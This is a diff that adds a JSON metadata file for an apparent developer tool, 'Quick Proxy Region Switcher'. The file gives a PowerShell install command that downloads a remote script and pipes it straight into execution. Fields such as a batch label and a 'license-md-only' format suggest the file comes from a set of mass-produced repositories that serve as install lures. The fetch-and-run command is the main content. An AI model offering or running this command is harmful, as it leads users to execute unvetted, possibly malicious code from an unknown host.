@@ -1,0 +1,22 @@
+{
+  "repo": "Quick-Proxy-Region-Switcher",
+  "product": "Quick Proxy Region Switcher",
+  "kind": "dev-tool",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30",
+  "format": "license-md-only",
+  "category": "dev",
+  "topics": [
+    "quick-proxy-region-switcher",
+    "quick",
+    "proxy",
+    "region",
+    "switcher",
+    "developer-tools",
+    "automation",
+    "cli",
+    "windows"
+  ]
+}
